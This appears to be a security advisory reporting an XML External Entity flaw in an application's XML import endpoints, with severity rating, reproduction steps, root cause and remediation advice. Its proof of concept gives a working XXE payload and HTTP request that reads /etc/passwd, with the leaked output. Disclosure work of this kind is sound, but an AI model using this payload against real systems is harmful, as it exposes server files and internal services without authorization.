# XML External Entity (XXE) Processing Allows Disclosure of Sensitive Files

## Summary

An **XML External Entity (XXE)** vulnerability exists in the application's XML import functionality.

The application processes user-supplied XML documents while external entity resolution is enabled. As a result, an authenticated attacker can submit a crafted XML document containing external entity declarations to access local files on the server.

Depending on the XML parser configuration, successful exploitation may also allow Server-Side Request Forgery (SSRF), disclosure of internal resources, or Denial-of-Service (DoS) attacks through malicious XML payloads.

---

## OWASP Category

**A05:2021 – Security Misconfiguration**

---

## Risk Rating

| Metric | Value |
|---------|-------|
| **Severity** | High (8.2) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L` |

---

## Affected Endpoints

```http
POST /api/import/xml
```

```http
POST /upload/xml
```

---

## Impact

An authenticated attacker can exploit the XML parser to access resources that should not be exposed.

Successful exploitation may result in:

- Disclosure of sensitive files from the server.
- Server-Side Request Forgery (SSRF) against internal services.
- Disclosure of internal network resources.
- Denial-of-Service (DoS) through malicious XML constructs, depending on parser configuration.
- Unauthorized access to sensitive application data.

---

## Steps to Reproduce

1. Authenticate as a regular user.
2. Prepare a malicious XML document containing an external entity declaration.
3. Submit the XML document to one of the affected endpoints:

```http
POST /api/import/xml
```

or

```http
POST /upload/xml
```

4. Observe that the XML parser resolves the external entity.
5. Verify that the contents of the referenced local file are returned in the application's response.

---

## Proof of Concept

### Malicious XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <name>&xxe;</name>
</root>
```

### Request

```http
POST /api/import/xml HTTP/1.1
Host: localhost:8000
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <name>&xxe;</name>
</root>
```

### Response

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## Root Cause

The XML parser is configured to process Document Type Definitions (DTDs) and resolve external entities supplied by user-controlled XML documents.

Because external entity resolution is enabled, attacker-controlled XML can reference local files or remote resources that are processed by the server.

---

## Remediation

- Disable Document Type Definition (DTD) processing in all XML parsers.
- Disable external entity resolution.
- Configure XML parsers to operate in secure mode.
- Validate XML documents against expected schemas.
- Prefer safer data formats such as JSON where XML is not required.
- Keep XML processing libraries and parser implementations up to date.
- Apply the Principle of Least Privilege to restrict file system access available to the application.

---

## References

- OWASP Top 10 2021 – A05: Security Misconfiguration
- OWASP XML External Entity (XXE) Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference
- CWE-827: Improper Control of Document Type Definition
